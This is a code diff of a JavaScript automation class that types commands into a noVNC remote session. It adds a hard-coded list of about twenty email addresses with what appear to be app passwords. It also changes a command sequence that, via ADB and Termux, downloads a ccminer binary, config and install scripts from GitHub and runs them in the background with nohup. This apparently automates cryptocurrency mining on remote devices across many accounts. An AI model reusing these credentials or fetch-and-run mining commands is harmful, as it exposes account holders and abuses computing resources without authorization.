@@ -1,6 +1,6 @@
 class Mine{
     inputField = document.getElementById("noVNC_container").getElementsByTagName("canvas")[0];
-    accounts = [];
+    accounts = ["nohealani@sturaman.com\nmfrk akts asaj lgsl\n","yumalay@sturaman.com\nurgn qjat ugqt zamh\n","jaquante12@fintning.com\nupxq zubc abfa yjda\n","goldenyellowc0@fintning.com\nrobc opbb njny siyx\n","juniper24@chrfeeul.com\nqnhc pdqe jibf bbym\n","yifoca3391@skrak.com\nloyf gggm eozw yzym\n","c5nto@rustyload.com\niqyc vzgn pelg hltm\n","falizapu@logsmarter.net\nmnri nqjc gtrv xnla\n","nor.adsekas.a.jo@gmail.com\nutne rivb lvlf clpb\n","rcaksbdkgziee+shade@gmail.com\nwdhj ebwp jnoe sbzl\n","intrepidnmw+hilliard@gmail.com\nayoo jabm aiwb mkrd\n","a.ba.y.ed.ris@gmail.com\ntknv dupu ndkp xnwc\n","svbdjekshskv+girard@gmail.com\nivff xwze xwbf cwhd\n","ousmane@proporud.com\nyxjn zxwu tsyh rbub\n","smsnfsmbtdndny+robertson@gmail.com\nvzst qswx qfuh riyc\n","canalvbm+mcdaniel@googlemail.com\nvzzr trgt yutb lxlm\n","tamimjhahmed53+silva@gmail.com\nzqnz oxvr nfas wrjc\n","cor.ri.dorf.gj@gmail.com\njfmu grok dupg eonw\n","smdngmsbfdndngn+florez@gmail.com\nbqxv xcry rarg qavq\n","rag.n.g.jb.a.h.m.kn@gmail.com\nxeyw pkkm xwhr bwwo\n","intrepidnmw+mims@gmail.com\neirz wact qssd mnaz\n"];
     constructor(){
         this.inputField.focus();
     }
@@ -11,7 +11,7 @@ class Mine{
             }
         };
     
-        if(key == '+' || key == ':' || key == '|' || isUpperCase(key)){
+        if(key == '+' || key == '&' ||key == '>' ||  key == ':' || key == '|' || isUpperCase(key)){
             let shift=true
             const keydownEvent = new KeyboardEvent('keydown', {
                 key: key,
@@ -105,7 +105,7 @@ class Mine{
             }else if(types==4){
                 this.sentText("adb install termux.apk\nadb shell monkey -p com.termux -v 500\n")
             }else if(types==5){
-                this.sentText("yes | pkg install git \ngit clone https://github.com/Lexa00heda/verusMining.git \ncd verusMining \nchmod +x install.sh \n./install.sh \n")
+                this.sentText("wget yes | pkg install tmux\ntmux\nmkdir verusMining\ncd verusMining\nyes | pkg install \nwget https://github.com/Lexa00heda/verusMining/raw/refs/heads/main/config.json\nwget https://github.com/Lexa00heda/verusMining/raw/refs/heads/main/ccminer\nwget https://github.com/Lexa00heda/verusMining/raw/refs/heads/main/start.sh\nwget https://github.com/Lexa00heda/verusMining/raw/refs/heads/main/install.sh \nchmod +x install.sh \nnohup ./install.sh  /dev/null  ./logFile 2>&1 &\n")
             }
     }
 }
